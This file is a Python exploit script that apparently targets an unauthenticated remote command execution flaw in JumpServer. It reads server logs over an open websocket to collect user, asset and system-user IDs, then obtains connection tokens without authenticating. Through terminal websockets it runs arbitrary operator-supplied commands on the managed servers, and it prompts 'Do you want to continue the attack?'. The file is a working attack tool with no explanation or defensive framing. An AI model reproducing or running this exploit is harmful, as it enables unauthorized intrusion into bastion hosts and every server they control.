import asyncio
import sys
import requests
import re
import websockets
import json

log_url = "/ws/ops/tasks/log/"
token_url = "/api/v1/authentication/connection-token/?user-only=Veraxy"
tty_url = "/koko/ws/token/?target_id="

# 读取日志，解析目标字段值
async def read_log(tar):
    print("===========Start read logs===========")
    log=''
    async with websockets.connect(tar) as client:
        await client.send(json.dumps({"task": "/opt/jumpserver/logs/gunicorn"}))
        while True:
            try:
                ret = json.loads(await client.recv())
                log += ret["message"]
                print("Reading...")
                re_result = set(re.compile('/api/v1/perms/asset-permissions/user/validate/\?action_name=connect&asset_id=(.*?)&cache_policy=1&system_user_id=(.*?)&user_id=(.*?) ').findall(log))
                if len(re.compile("\"GET\s{1}/api/health/\s{1}HTTP/1.1\"\s\d*\s\d*").findall(ret["message"])) == 1:
                    print(" ######  %d targets detected：#####"% len(re_result))
                    for result in re_result:
                        print("asset_id="+result[0]+",  system_user_id="+result[1]+",  user_id="+result[2])
                    print("===========Finish read logs============\n")
                    return list(re_result)
            except asyncio.TimeoutError:
                print("********connection timeout！")
                break

# 向服务器端发送认证后的消息
async def send_msg(websocket,_text):
    if _text == "exit":
        print(f'you have enter "exit", goodbye')
        await websocket.close(reason="user exit")
        return False
    await websocket.send(_text)
    recv_text = await websocket.recv()
    print(f"{recv_text}")

# 获取token
def get_token(user,asset,system_user):
    data = {"user": user, "asset": asset, "system_user": system_user}
    token_target = host + token_url
    res = requests.post(token_target, json=data)
    token = res.json()["token"]
    return token

# 判断目标状态
async def Detection_target(cmd,current_target):
    async with websockets.connect(current_target) as websocket:
        recv_text = await websocket.recv()
        resws=json.loads(recv_text)
        id = resws['id']
        inittext = json.dumps({"id": id, "type": "TERMINAL_INIT", "data": "{\"cols\":234,\"rows\":13 }"})
        await send_msg(websocket,inittext)
        cmdtext = json.dumps({"id": id, "type": "TERMINAL_DATA", "data": cmd+"\r\n"})
        await send_msg(websocket, cmdtext)
        for i in range(10):
            recv_text = await websocket.recv()
            print("waiting.....")
            if recv_text.count("hlXFGQET6uBbxgyl") == 2:
                return True
        return False

# 建立连接
async def main_logic(cmd):
    async with websockets.connect(target) as websocket:
        recv_text = await websocket.recv()
        print(f"{recv_text}")
        resws=json.loads(recv_text)
        id = resws['id']
        print("ws id: "+id)
        print("init ws")
        inittext = json.dumps({"id": id, "type": "TERMINAL_INIT", "data": "{\"cols\":234,\"rows\":13 }"})
        await send_msg(websocket,inittext)
        print("###############")
        print("exec command:")
        cmdtext = json.dumps({"id": id, "type": "TERMINAL_DATA", "data": cmd+"\r\n"})
        print(cmdtext)
        await send_msg(websocket, cmdtext)
        for i in range(20):
            recv_text = await websocket.recv()
            print(f"{recv_text}")
        print('===========finish')

if __name__ == "__main__":
    host = sys.argv[1]
    log_target = host.replace("https://", "wss://").replace("http://", "ws://") + log_url
    print("log_target: %s" % (log_target,))
    # 获取user、asset、system_user组成的目标集合
    message = asyncio.get_event_loop().run_until_complete(read_log(log_target))
    # 判断目标是否可用
    print("===========Check for  target connectivity============")
    actine_result=[]
    for result in message:
        token = get_token(result[2],result[0],result[1])
        current_target = "ws://" + host.replace("http://", '') + tty_url + token
        status = asyncio.get_event_loop().run_until_complete(Detection_target("echo hlXFGQET6uBbxgyl", current_target))
        print(status)
        if status == True:
            actine_result.append(result)
    print("#########%d targets can be connected##########"% (len(actine_result),))
    i = 1
    for result in actine_result:
        print(str(i) + ") " + "asset_id=" + result[0] + ",  system_user_id=" + result[1] + ",  user_id=" + result[2])
        i += 1
    choice = input("\nDo you want to continue the attack？ Yes or No:")
    if choice.upper() == "YES":
        print("Please select the target:")
        choice_target = int(input(">>>"))
        if choice_target > len(message):
            choice_target = int(input("Please reselect:"))
        print("Your choice is %s" % choice_target)
        cmd = input("Please enter the command to execute：")
        print("\n ======waiting=======")
        # 获取token
        token = get_token(actine_result[choice_target-1][2],actine_result[choice_target-1][0], actine_result[choice_target-1][1])
        print("token: %s" % (token,))
        target = "ws://" + host.replace("http://", '') + tty_url + token
        # 建立tty连接
        print("websocket target: %s" % (target,))
        print("===========Start connection establishment===========")
        asyncio.get_event_loop().run_until_complete(main_logic(cmd))
    else:
        print("==========End Target Discovery============")